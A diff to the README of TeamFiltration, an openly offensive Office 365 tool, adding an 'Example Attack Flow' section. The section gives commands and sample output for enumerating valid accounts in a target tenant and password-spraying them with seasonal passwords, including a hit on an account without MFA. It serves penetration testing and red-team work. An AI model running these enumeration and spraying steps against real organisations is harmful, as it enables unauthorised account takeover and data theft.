@@ -4,7 +4,7 @@ TeamFiltration is a cross-platform framework for enumerating, spraying, exfiltra
 
 This tool has been used internally since January 2021 and was publicly released in my talk "Taking a Dumb In The Cloud" during DefCON30.
 
-You will need to provide a json config file to be able to use TeamFiltration. This configuration file contains information such as PushoverAPI keys, Dehashed API keys, Fireprox endpoints URL and much more. Please see the [guide further down](#TeamFiltration-Configruation) on how to create your own config.
+You will need to provide a json config file to be able to use TeamFiltration. This configuration file contains information such as PushoverAPI keys, Dehashed API keys, Fireprox endpoints URL and much more. Please see the [guide further down](#TeamFiltration-Configuration) on how to create your own config.
 
 ## Download
 [You can download the latest precompiled release for Linux, Windows and MacOSX X64 ](https://github.com/Flangvik/TeamFiltration/releases/latest)   
@@ -118,6 +118,80 @@ Usage:
         --outpath C:\Clients\2021\FooBar\TFOutput --config myCustomConfig.json --enum --validate-msol --usernames C:\Clients\2021\FooBar\OSINT\Usernames.txt
         --outpath C:\Clients\2021\FooBar\TFOutput --config myCustomConfig.json --backdoor
         --outpath C:\Clients\2021\FooBar\TFOutput --config myCustomConfig.json --database
+```
+
+
+## Example Attack Flow
+
+Start the external by performing recon using Dehashed, Linkedin, Hunter.io, Google Dorks etc.
+When you figured out what the email syntax for the company is, you are ready to enumerate and validate emails that exists within the target o365 tenant
+
+The --outpath is needed for all modules within TeamFiltration, and acts as a localised workspace / project folder for all information related to this attack/client to be stored
+
+Start the enum with the following command, where --domain is your target client domain name
+```
+ TeamFiltration.exe --outpath C:\Clients\2021\Example\TFOutput --config myConfig.json --enum --validate-teams --domain legitcorp.net
+```
+
+Choose the enumerated email syntax. This will pull different emails and syntaxes from the statistically likely usernames repo. Once you select a syntax, TeamFiltration will use its private, passive and unsaturated Teams method to validate them (hence the --validate-teams argument)
+
+```
+[♥] TeamFiltration V0.3.2.6, created by @Flangvik
+[+] Args parsed --outpath F:\Clients\Example\TFOutput --config myConfig.json --enum --validate-teams --domain legitcorp.net
+[+] No usernames list provided, pulling statistically-likely-usernames
+[?] Provide a target domain/tenant (e.g legitcorp.net) #> legitcorp.net
+    |=> [1] john.smith@legitcorp.net
+    |=> [2] john@legitcorp.net
+    |=> [3] johnjs@legitcorp.net
+    |=> [4] johns@legitcorp.net
+    |=> [5] johnsmith@legitcorp.net
+    |=> [6] jsmith@legitcorp.net
+    |=> [7] smith@legitcorp.net
+    |=> [8] smithj@legitcorp.net
+    |=> [9] john_smith@legitcorp.net
+
+[?] Select an email format #> 1
+```
+
+If you would like to supply your own email list to validate, simply use the --usernames argument.
+Validated emails get stored automatically in the TeamFiltration.db file located in the --outpath folder. This way, there is no need to supply data manually through each module.
+
+```
+[ENUM] 24.05.2021 12:31:05 EST Filtering out previusly attempted accounts
+[ENUM] 24.05.2021 12:31:06 EST Enumerating 248231 possible accounts, this will take ~14 minutes
+[ENUM] 24.05.2021 12:31:07 EST Successfully got Teams token for sacrificial account
+[ENUM] 24.05.2021 12:31:07 EST Loaded 248231 usernames
+[ENUM] 24.05.2021 12:31:08 EST enita.lintz@legitcorp.net valid!
+[ENUM] 24.05.2021 12:31:09 EST bruce.wayne@legitcorp.net valid!
+[ENUM] 24.05.2021 12:31:13 EST herminia.oliva@legitcorp.net valid!
+[ENUM] 24.05.2021 12:31:13 EST thomas.anderson@legitcorp.net valid!
+[ENUM] 24.05.2021 12:31:17 EST sharilyn.penning@legitcorp.net valid!
+```
+Next up we will spray the validated emails with the following command
+
+```
+ TeamFiltration.exe --outpath C:\Clients\2021\Example\TFOutput --config myConfig.json --spray --sleep-min 120 --sleep-max 200 
+```
+
+When no passwords list is provided, TeamFiltration will generate its own based on the Month, Season, and year!
+If you would like to supply your own passwordlist, simply use the --passwords argument.
+
+```
+[♥] TeamFiltration V0.3.2.6, created by @Flangvik
+[+] Args parsed --outpath F:\Clients\Example\TFOutput --config myConfig.json --spray --sleep-min 120 --sleep-max 200 
+[SPRAY] 24.05.2021 12:33:54 EST Sleeping between 60-100 minutes for each round
+[SPRAY] us-west-1 24.05.2021 12:33:55 EST Sprayed renita.lintz@legitcorp.net:Spring2021!          => INVALID
+[SPRAY] us-west-1 24.05.2021 12:33:55 EST Sprayed bruce.wayne@legitcorp.net:Spring2021!           => INVALID
+[SPRAY] us-west-1 24.05.2021 12:33:57 EST Sprayed herminia.oliva@legitcorp.net:Spring2021!        => INVALID
+[SPRAY] us-west-1 24.05.2021 12:33:57 EST Sprayed biff.tannen@legitcorp.net:Spring2021!           => INVALID
+[SPRAY] us-west-1 24.05.2021 12:33:58 EST Sprayed elijah.blakley@legitcorp.net:Spring2021!        => INVALID
+[SPRAY] us-west-1 24.05.2021 12:33:58 EST Sprayed thomas.anderson@legitcorp.net:Spring2021!       => VALID NO MFA!
+[SPRAY] us-west-1 24.05.2021 12:33:59 EST Sprayed chris.kelly@legitcorp.net:Spring2021!           => INVALID
+[SPRAY] us-west-1 24.05.2021 12:33:59 EST Sprayed deadpool@legitcorp.net:Spring2021!              => INVALID
+[SPRAY] us-west-1 24.05.2021 12:34:00 EST Sprayed sharilyn.penning@legitcorp.net:Spring2021!      => INVALID
+[SPRAY] us-west-1 24.05.2021 12:34:01 EST Sprayed master.kevin@legitcorp.net:Spring2021!          => INVALID
+[SPRAY] us-west-1 24.05.2021 12:34:01 EST Sprayed adam.wally@legitcorp.net:Spring2021!            => INVALID
+[SPRAY] 24.05.2021 12:34:01 EST Sleeping 78 before next spray
 ```
 
 With a set of valid credentials found, we can move into the exfil module. The valid credentials and account information is stored in the teamfiltration database, so you do not need to provide them when using the --exfil module.
